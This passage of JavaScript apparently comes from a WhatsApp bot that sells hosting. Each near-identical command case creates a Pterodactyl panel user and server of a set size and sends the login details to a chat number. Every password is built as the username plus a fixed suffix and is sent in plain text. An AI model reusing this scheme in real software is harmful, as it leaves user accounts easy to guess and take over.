locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "26gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "26GB"
let egg = global.eggsnya
let loc = global.location
let memo = "26240"
let cpu = "770"
let disk = "26240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "25gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "25GB"
let egg = global.eggsnya
let loc = global.location
let memo = "25240"
let cpu = "700"
let disk = "25240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "24gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "24GB"
let egg = global.eggsnya
let loc = global.location
let memo = "24240"
let cpu = "660"
let disk = "24240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "23gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "23GB"
let egg = global.eggsnya
let loc = global.location
let memo = "23240"
let cpu = "610"
let disk = "23240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "50gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "50GB"
let egg = global.eggsnya
let loc = global.location
let memo = "50240"
let cpu = "700"
let disk = "50240"
let email = username + "50gb@gmail.com"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "123"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "22gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "22GB"
let egg = global.eggsnya
let loc = global.location
let memo = "22240"
let cpu = "590"
let disk = "22240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "21GB"
let egg = global.eggsnya
let loc = global.location
let memo = "21240"
let cpu = "570"
let disk = "21240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "20gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "19gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "19GB"
let egg = global.eggsnya
let loc = global.location
let memo = "19240"
let cpu = "500"
let disk = "19240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "18gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "18GB"
let egg = global.eggsnya
let loc = global.location
let memo = "18240"
let cpu = "480"
let disk = "18240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
